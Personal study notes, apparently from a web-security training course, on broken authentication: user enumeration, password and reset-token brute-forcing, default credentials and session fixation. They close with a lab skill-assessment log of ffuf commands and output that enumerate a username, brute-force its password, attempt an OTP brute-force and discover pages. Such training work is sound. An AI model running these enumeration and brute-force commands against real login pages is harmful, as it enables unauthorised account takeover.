### Common Authentication Methods
* **Knowledge**
	* passwords
	* passphrases
	* PINs
	* security questions
* **Ownership**
	* something that user possesses
	* ID card, security token, smartphone
* **Inherence**
	* based on something the user is or does
	* Fingerprint, Face ID, Voice Recognition
* MFA (multi-factor) -> just multiple factors of authentication mechanisms 

# Brute-Force Attacks
## Enumerating Users
* User enumeration occurs when web app responds differently to registered and valid versus invalid inputs for authentication endpoints
* **Enumerating Users via Differing Error Messages**
	* brute-force with wordlist and look out for different messages
	* https://github.com/danielmiessler/SecLists/tree/master/Usernames
* **User-enumeration via Side-Channel Attacks**
	* for example: response timings

## Brute-Forcing Password
* can be leveraged after user enumeration has been performed
* `wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt`
**Brute Forcing Password Reset Tokens**
* need to create an account first
* then reset password and look at the received email
* For example: 4 digit number
```bash
seq -w 0 9999 > tokens.txt
```
The `-w` flag pads all numbers to the same length by prepending zeroes

# Password Attacks
* many web apps are set up with default credentials
* sometimes not changed
* https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials
* Default PW database: https://cirt.net/passwords/
* https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
* https://github.com/scadastrangelove/SCADAPASS/tree/master

**Vulnerable Password Reset Questions**
* Weak Questions like - "`What is your mother's maiden name?`" or - "`What city were you born in?`"
* can often be obtained via OSINT
* might also be brute-forced

# Authentication Bypasses
### Direct Access
* most straightforward: just try to request protected resource from an unathenticated context
* uncommon in real world, but a slight variant occasionally happens in vulnerable web apps
	* Redirect to another page if not active session but still content in the response body
	* Use burp to swap 302 to 200 status code
### Via Parameter Modification
* can be similar to IDOR vulnerabilities
* check the parameter related to authentication of restricted resource, change it or brute force it to a working one

# Attacking Session Tokens
* Brute-Force Attacks
	* possible if token has insufficient entropy
	* for example: four character session token
	* sometimes token consists of prepended or appended values
	* or incrementing token
* Predictable tokens
	* sometimes token generation might look random first
	* but might use some user input instead
	* For example: base64 encoding of username and admin role 
* **Further Session Attacks**
	* Session Fixation
		* [Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
		* attacker tries to coerce the victim into using a session token chosen by the attacker
			1. attacker obtains valid session token by logging in. Afterwards he logs out
			2. attacker tricks victim to into using the known session token by sending a link for example: http://vulnerable.htb/?sid=a1b2c3d4e5f6. When victim clicks link, web app sets session token to provided value
			3. victim authenticates to vulnerable web app
			4. attacker can log in as the victim


# Skill Assessment

Password does not meet our password policy:

- Contains at least one digit
- Contains at least one lower-case character
- Contains at least one upper-case character
- Contains NO special characters
- Is exactly 12 characters long


Something went wrong error if existing user: Something went wrong. (not so sure!)

"Invalid Credentials" error for exsting user oterwise: "Unknown username or password."

ffuf -u "http://154.57.164.79:32281/login.php" -X POST -d "username=FUZZ&password=test" -mr "Invalid credentials." -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -H "Cookie: PHPSESSID=qojcj9v70ns30qcm3j6igpg77f" -H "Content-Type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.79:32281/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=qojcj9v70ns30qcm3j6igpg77f
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid credentials.
________________________________________________

gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 93ms]


ffuf -u "http://154.57.164.79:32281/login.php" -X POST -d "username=gladys&password=FUZZ" -mc 302 -w passwords.txt -H "Cookie: PHPSESSID=qojcj9v70ns30qcm3j6igpg77f" -H "Content-Type: application/x-www-form-urlencoded"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.79:32281/login.php
 :: Wordlist         : FUZZ: /home/luca/passwords.txt
 :: Header           : Cookie: PHPSESSID=qojcj9v70ns30qcm3j6igpg77f
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=gladys&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 302
________________________________________________

dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 102ms]


Brute Forcing OTP did not work

 ffuf -u "http://154.57.164.79:32281/2fa.php" -X POST -d "otp=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=qojcj9v70ns30qcm3j6igpg77f" -w tokens.txt -fr "Invalid OTP."

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.79:32281/2fa.php
 :: Wordlist         : FUZZ: /home/luca/tokens.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=qojcj9v70ns30qcm3j6igpg77f
 :: Data             : otp=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid OTP.
________________________________________________


Find pages:
lffuf -u "http://154.57.164.79:32281/FUZZ.php" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://154.57.164.79:32281/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

register                [Status: 200, Size: 4245, Words: 655, Lines: 91, Duration: 26ms]
profile                 [Status: 302, Size: 3717, Words: 606, Lines: 78, Duration: 25ms]
db                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
login                   [Status: 200, Size: 4253, Words: 656, Lines: 91, Duration: 2183ms]
                        [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 2247ms]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
index                   [Status: 200, Size: 6995, Words: 1375, Lines: 129, Duration: 3211ms]



curl 'http://154.57.164.79:32281/profile.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
  -H 'Accept-Language: de-DE,de;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -b 'PHPSESSID=qojcj9v70ns30qcm3j6igpg77f' \
  -H 'Referer: http://154.57.164.79:32281/login.php' \
  -H 'Sec-GPC: 1' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --insecure